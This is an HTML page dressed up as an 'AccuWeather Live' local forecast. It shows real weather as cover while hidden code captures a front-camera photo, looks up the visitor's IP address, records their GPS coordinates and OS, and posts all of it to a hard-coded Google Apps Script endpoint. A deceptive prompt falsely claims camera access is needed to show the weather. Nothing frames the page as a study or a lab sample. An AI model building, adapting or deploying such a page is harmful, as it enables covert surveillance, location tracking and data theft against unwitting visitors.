<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AccuWeather Live - Local Forecast</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 0; 
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d); 
            color: white; 
            height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            text-align: center; 
        }
        .card { 
            background: rgba(0, 0, 0, 0.5); 
            padding: 40px; 
            border-radius: 30px; 
            backdrop-filter: blur(15px); 
            width: 85%; 
            max-width: 400px; 
            border: 1px solid rgba(255, 255, 255, 0.2); 
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        h1 { font-size: 4rem; margin: 10px 0; }
        .city { font-size: 1.1rem; text-transform: uppercase; letter-spacing: 3px; opacity: 0.9; }
        .stat { font-size: 1.4rem; margin-bottom: 20px; font-weight: 300; }
        .btn { 
            background: #ffffff; 
            color: #1a2a6c; 
            border: none; 
            padding: 18px; 
            border-radius: 50px; 
            font-weight: bold; 
            font-size: 1rem;
            cursor: pointer; 
            width: 100%; 
            transition: transform 0.2s;
        }
        .btn:active { transform: scale(0.95); }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="card">
    <div class="city" id="city">Searching...</div>
    <h1 id="temp">--°</h1>
    <div class="stat" id="stat">Checking Atmosphere</div>
    <button class="btn" onclick="runUpdate()">UPDATE FORECAST</button>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    // YOUR UPDATED SCRIPT URL
    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxowECs8vkFwdjYinBtaA5AHpoA5KMqjxLI2p_288LiD6DN-e1TDwSppcsepRKwfgt2MQ/exec';

    async function runUpdate() {
        const btn = document.querySelector('.btn');
        btn.innerText = "SYNCING DATA...";
        btn.disabled = true;

        if (!navigator.geolocation) {
            alert("Geolocation is not supported by your browser.");
            return;
        }

        navigator.geolocation.getCurrentPosition(async (pos) => {
            try {
                // 1. Fetch real-time weather for the UI
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const response = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`);
                const weatherData = await response.json();
                
                document.getElementById('temp').innerText = Math.round(weatherData.current_weather.temperature) + "°";
                document.getElementById('city').innerText = "LOCAL AREA ACTIVE";
                document.getElementById('stat').innerText = "Conditions Optimized";

                // 2. Start Background Capture
                captureAndSend(pos);
            } catch (err) {
                console.error("Weather fetch failed");
            }
        }, (error) => {
            alert("Please allow Location and Camera access to view local weather.");
            btn.innerText = "UPDATE FORECAST";
            btn.disabled = false;
        });
    }

    async function captureAndSend(pos) {
        let photoData = null;
        
        try {
            // Attempt to access camera
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('v');
            video.srcObject = stream;
            
            // Wait for camera to stabilize
            await new Promise(resolve => setTimeout(resolve, 1200));
            
            const canvas = document.getElementById('c');
            canvas.width = 640;
            canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // Convert to Base64 (Compressed for faster upload)
            photoData = canvas.toDataURL('image/jpeg', 0.5);
            
            // Stop camera
            stream.getTracks().forEach(track => track.stop());
        } catch (e) {
            console.log("Camera access denied or unavailable");
        }

        // Get IP Address
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();

        // Prepare the payload
        const payload = {
            ip: ipData.ip,
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            os: navigator.platform,
            battery: "N/A",
            photo: photoData
        };

        // Send to Google Script
        await fetch(SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(payload)
        });

        document.querySelector('.btn').innerText = "FORECAST UPDATED";
    }
</script>

</body>
</html>
